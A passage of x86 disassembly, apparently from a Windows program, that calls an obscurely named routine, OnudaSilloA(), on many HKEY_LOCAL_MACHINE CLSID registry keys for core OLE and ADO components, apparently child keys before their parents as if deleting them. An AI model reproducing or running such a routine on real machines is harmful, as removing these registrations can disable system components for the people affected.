  push 0042E8C0h ; "SOFTWARE\Classes\CLSID\{00000308-0000-0000-C000-000000000046}\InprocServer32"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003EFh
  push 0042E960h ; "SOFTWARE\Classes\CLSID\{00000308-0000-0000-C000-000000000046}"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003F0h
  push 0042E9E0h ; "SOFTWARE\Classes\CLSID\{00000309-0000-0000-C000-000000000046}\InprocServer32"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003F1h
  push 0042EAA8h ; "SOFTWARE\Classes\CLSID\{00000309-0000-0000-C000-000000000046}"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003F2h
  push 0042EB28h ; "SOFTWARE\Classes\CLSID\{0000030B-0000-0000-C000-000000000046}\InprocServer32"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003F3h
  push 0042EBC8h ; "SOFTWARE\Classes\CLSID\{0000030B-0000-0000-C000-000000000046}"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003F4h
  push 0042EC54h ; "SOFTWARE\Classes\CLSID\{00000315-0000-0000-C000-000000000046}\AuxUserType\2"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003F5h
  push 0042ECF0h ; "SOFTWARE\Classes\CLSID\{00000315-0000-0000-C000-000000000046}\AuxUserType"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003F6h
  push 0042ED88h ; "SOFTWARE\Classes\CLSID\{00000315-0000-0000-C000-000000000046}\Conversion\Readable\Main"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003F7h
  push 0042EE3Ch ; "SOFTWARE\Classes\CLSID\{00000315-0000-0000-C000-000000000046}\Conversion\Readable"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003F8h
  push 0042EEE4h ; "SOFTWARE\Classes\CLSID\{00000315-0000-0000-C000-000000000046}\Conversion"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003F9h
  push 0042EF7Ch ; "SOFTWARE\Classes\CLSID\{00000315-0000-0000-C000-000000000046}\DataFormats\GetSet\0"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003FAh
  push 0042F028h ; "SOFTWARE\Classes\CLSID\{00000315-0000-0000-C000-000000000046}\DataFormats\GetSet"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003FBh
  push 0042F0D0h ; "SOFTWARE\Classes\CLSID\{00000315-0000-0000-C000-000000000046}\DataFormats\DefaultFile"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003FCh
  push 0042F180h ; "SOFTWARE\Classes\CLSID\{00000315-0000-0000-C000-000000000046}\DataFormats"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003FDh
  push 0042F21Ch ; "SOFTWARE\Classes\CLSID\{00000315-0000-0000-C000-000000000046}\InprocServer32"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003FEh
  push 0042F2BCh ; "SOFTWARE\Classes\CLSID\{00000315-0000-0000-C000-000000000046}\MiscStatus"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000003FFh
  push 0042F354h ; "SOFTWARE\Classes\CLSID\{00000315-0000-0000-C000-000000000046}\ProgID"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000400h
  push 0042F408h ; "SOFTWARE\Classes\CLSID\{00000315-0000-0000-C000-000000000046}"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000401h
  push 0042F488h ; "SOFTWARE\Classes\CLSID\{00000316-0000-0000-C000-000000000046}\ProgID"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000402h
  push 0042F518h ; "SOFTWARE\Classes\CLSID\{00000316-0000-0000-C000-000000000046}\InprocServer32"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000403h
  push 0042F5B8h ; "SOFTWARE\Classes\CLSID\{00000316-0000-0000-C000-000000000046}\DataFormats\GetSet\0"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000404h
  push 0042F664h ; "SOFTWARE\Classes\CLSID\{00000316-0000-0000-C000-000000000046}\DataFormats\GetSet"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000405h
  push 0042F7A4h ; "SOFTWARE\Classes\CLSID\{00000316-0000-0000-C000-000000000046}\DataFormats\DefaultFile"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000406h
  push 0042F854h ; "SOFTWARE\Classes\CLSID\{00000316-0000-0000-C000-000000000046}\DataFormats"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000407h
  push 0042F988h ; "SOFTWARE\Classes\CLSID\{00000316-0000-0000-C000-000000000046}\Conversion\Readable\Main"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000408h
  push 0042FA3Ch ; "SOFTWARE\Classes\CLSID\{00000316-0000-0000-C000-000000000046}\Conversion\Readable"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000409h
  push 0042FAE4h ; "SOFTWARE\Classes\CLSID\{00000316-0000-0000-C000-000000000046}\Conversion"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000040Ah
  push 0042F8ECh ; "SOFTWARE\Classes\CLSID\{00000316-0000-0000-C000-000000000046}\AuxUserType\2"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000040Bh
  push 0042F70Ch ; "SOFTWARE\Classes\CLSID\{00000316-0000-0000-C000-000000000046}\AuxUserType"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000040Ch
  push 0042FB7Ch ; "SOFTWARE\Classes\CLSID\{00000316-0000-0000-C000-000000000046}"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000040Dh
  push 0042FBFCh ; "SOFTWARE\Classes\CLSID\{00000319-0000-0000-C000-000000000046}\ProgID"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000040Eh
  push 0042FC8Ch ; "SOFTWARE\Classes\CLSID\{00000319-0000-0000-C000-000000000046}\InprocServer32"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000040Fh
  push 0042FD2Ch ; "SOFTWARE\Classes\CLSID\{00000319-0000-0000-C000-000000000046}\DataFormats\GetSet\0"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000410h
  push 0042FDD8h ; "SOFTWARE\Classes\CLSID\{00000319-0000-0000-C000-000000000046}\DataFormats\GetSet"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000411h
  push 0042FF18h ; "SOFTWARE\Classes\CLSID\{00000319-0000-0000-C000-000000000046}\DataFormats\DefaultFile"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000412h
  push 0042FFC8h ; "SOFTWARE\Classes\CLSID\{00000319-0000-0000-C000-000000000046}\DataFormats"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000413h
  push 004300FCh ; "SOFTWARE\Classes\CLSID\{00000319-0000-0000-C000-000000000046}\Conversion\Readable\Main"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000414h
  push 004301B0h ; "SOFTWARE\Classes\CLSID\{00000319-0000-0000-C000-000000000046}\Conversion\Readable"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000415h
  push 00430258h ; "SOFTWARE\Classes\CLSID\{00000319-0000-0000-C000-000000000046}\Conversion"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000416h
  push 00430060h ; "SOFTWARE\Classes\CLSID\{00000319-0000-0000-C000-000000000046}\AuxUserType\2"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000417h
  push 0042FE80h ; "SOFTWARE\Classes\CLSID\{00000319-0000-0000-C000-000000000046}\AuxUserType"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000418h
  push 004302F0h ; "SOFTWARE\Classes\CLSID\{00000319-0000-0000-C000-000000000046}"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000419h
  push 00430370h ; "SOFTWARE\Classes\CLSID\{0000031A-0000-0000-C000-000000000046}\ProgID"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000041Ah
  push 00430400h ; "SOFTWARE\Classes\CLSID\{0000031A-0000-0000-C000-000000000046}\InprocServer32"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000041Bh
  push 004304A0h ; "SOFTWARE\Classes\CLSID\{0000031A-0000-0000-C000-000000000046}"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000041Ch
  push 00430520h ; "SOFTWARE\Classes\CLSID\{0000031D-0000-0000-C000-000000000046}\InProcServer32"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000041Dh
  push 004305C0h ; "SOFTWARE\Classes\CLSID\{0000031D-0000-0000-C000-000000000046}"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000041Eh
  push 00430690h ; "SOFTWARE\Classes\CLSID\{00000320-0000-0000-C000-000000000046}\InprocServer32"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000041Fh
  push 00430730h ; "SOFTWARE\Classes\CLSID\{00000320-0000-0000-C000-000000000046}"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000420h
  push 004307B0h ; "SOFTWARE\Classes\CLSID\{00000327-0000-0000-C000-000000000046}\ProgID"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000421h
  push 00430840h ; "SOFTWARE\Classes\CLSID\{00000327-0000-0000-C000-000000000046}\InprocServer32"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000422h
  push 004308E0h ; "SOFTWARE\Classes\CLSID\{00000327-0000-0000-C000-000000000046}"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000423h
  push 00430960h ; "SOFTWARE\Classes\CLSID\{0000032E-0000-0000-C000-000000000046}\InprocServer32"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000424h
  push 00430A24h ; "SOFTWARE\Classes\CLSID\{0000032E-0000-0000-C000-000000000046}"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000425h
  push 00430AA4h ; "SOFTWARE\Classes\CLSID\{00000507-0000-0010-8000-00AA006D2EA4}\VersionIndependentProgID"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000426h
  push 00430B58h ; "SOFTWARE\Classes\CLSID\{00000507-0000-0010-8000-00AA006D2EA4}\ProgID"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000427h
  push 00430C08h ; "SOFTWARE\Classes\CLSID\{00000507-0000-0010-8000-00AA006D2EA4}\InprocServer32"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000428h
  push 00430CA8h ; "SOFTWARE\Classes\CLSID\{00000507-0000-0010-8000-00AA006D2EA4}"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000429h
  push 00430D28h ; "SOFTWARE\Classes\CLSID\{0000050B-0000-0010-8000-00AA006D2EA4}\VersionIndependentProgID"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000042Ah
  push 00430DF0h ; "SOFTWARE\Classes\CLSID\{0000050B-0000-0010-8000-00AA006D2EA4}\ProgID"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000042Bh
  push 00430E80h ; "SOFTWARE\Classes\CLSID\{0000050B-0000-0010-8000-00AA006D2EA4}\InprocServer32"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000042Ch
  push 00430F20h ; "SOFTWARE\Classes\CLSID\{0000050B-0000-0010-8000-00AA006D2EA4}"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000042Dh
  push 00430FA0h ; "SOFTWARE\Classes\CLSID\{00000514-0000-0010-8000-00AA006D2EA4}\VersionIndependentProgID"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000042Eh
  push 00431054h ; "SOFTWARE\Classes\CLSID\{00000514-0000-0010-8000-00AA006D2EA4}\ProgID"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000042Fh
  push 004310E4h ; "SOFTWARE\Classes\CLSID\{00000514-0000-0010-8000-00AA006D2EA4}\InprocServer32"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000430h
  push 00431184h ; "SOFTWARE\Classes\CLSID\{00000514-0000-0010-8000-00AA006D2EA4}"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000431h
  push 00431204h ; "SOFTWARE\Classes\CLSID\{0000051A-0000-0010-8000-00AA006D2EA4}\ExtendedErrors\{00000542-0000-0010-8000-00AA006D2EA4}"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000432h
  push 00431370h ; "SOFTWARE\Classes\CLSID\{0000051A-0000-0010-8000-00AA006D2EA4}\ExtendedErrors"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000433h
  push 00431410h ; "SOFTWARE\Classes\CLSID\{0000051A-0000-0010-8000-00AA006D2EA4}"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000434h
  push 00431490h ; "SOFTWARE\Classes\CLSID\{00000535-0000-0010-8000-00AA006D2EA4}\VersionIndependentProgID"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000435h
  push 00431558h ; "SOFTWARE\Classes\CLSID\{00000535-0000-0010-8000-00AA006D2EA4}\ProgID"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000436h
  push 004315E8h ; "SOFTWARE\Classes\CLSID\{00000535-0000-0010-8000-00AA006D2EA4}\InprocServer32"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000437h
  push 00431688h ; "SOFTWARE\Classes\CLSID\{00000535-0000-0010-8000-00AA006D2EA4}"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000438h
  push 00431708h ; "SOFTWARE\Classes\CLSID\{00000541-0000-0010-8000-00AA006D2EA4}\VersionIndependentProgID"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000439h
  push 004317BCh ; "SOFTWARE\Classes\CLSID\{00000541-0000-0010-8000-00AA006D2EA4}\ProgID"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000043Ah
  push 0043184Ch ; "SOFTWARE\Classes\CLSID\{00000541-0000-0010-8000-00AA006D2EA4}\InprocServer32"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000043Bh
  push 004312F0h ; "SOFTWARE\Classes\CLSID\{00000541-0000-0010-8000-00AA006D2EA4}"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000043Ch
  push 004318ECh ; "SOFTWARE\Classes\CLSID\{00000542-0000-0010-8000-00AA006D2EA4}\VersionIndependentProgID"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000043Dh
  push 004319A0h ; "SOFTWARE\Classes\CLSID\{00000542-0000-0010-8000-00AA006D2EA4}\ProgID"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000043Eh
  push 00431A30h ; "SOFTWARE\Classes\CLSID\{00000542-0000-0010-8000-00AA006D2EA4}\InprocServer32"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000043Fh
  push 00431AD0h ; "SOFTWARE\Classes\CLSID\{00000542-0000-0010-8000-00AA006D2EA4}"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000440h
  push 00431B50h ; "SOFTWARE\Classes\CLSID\{00000560-0000-0010-8000-00AA006D2EA4}\VersionIndependentProgID"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000441h
  push 00431C04h ; "SOFTWARE\Classes\CLSID\{00000560-0000-0010-8000-00AA006D2EA4}\ProgID"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000442h
  push 00431CBCh ; "SOFTWARE\Classes\CLSID\{00000560-0000-0010-8000-00AA006D2EA4}\InprocServer32"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000443h
  push 00431D5Ch ; "SOFTWARE\Classes\CLSID\{00000560-0000-0010-8000-00AA006D2EA4}"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000444h
  push 00431DDCh ; "SOFTWARE\Classes\CLSID\{00000566-0000-0010-8000-00AA006D2EA4}\VersionIndependentProgID"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000445h
  push 00431EA4h ; "SOFTWARE\Classes\CLSID\{00000566-0000-0010-8000-00AA006D2EA4}\ProgID"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000446h
  push 00431F34h ; "SOFTWARE\Classes\CLSID\{00000566-0000-0010-8000-00AA006D2EA4}\InprocServer32"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000447h
  push 00431FD4h ; "SOFTWARE\Classes\CLSID\{00000566-0000-0010-8000-00AA006D2EA4}"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000448h
  push 00432054h ; "SOFTWARE\Classes\CLSID\{00000602-0000-0010-8000-00AA006D2EA4}\VersionIndependentProgID"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000449h
  push 00432108h ; "SOFTWARE\Classes\CLSID\{00000602-0000-0010-8000-00AA006D2EA4}\ProgID"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000044Ah
  push 00432198h ; "SOFTWARE\Classes\CLSID\{00000602-0000-0010-8000-00AA006D2EA4}\InprocServer32"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000044Bh
  push 00432238h ; "SOFTWARE\Classes\CLSID\{00000602-0000-0010-8000-00AA006D2EA4}"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
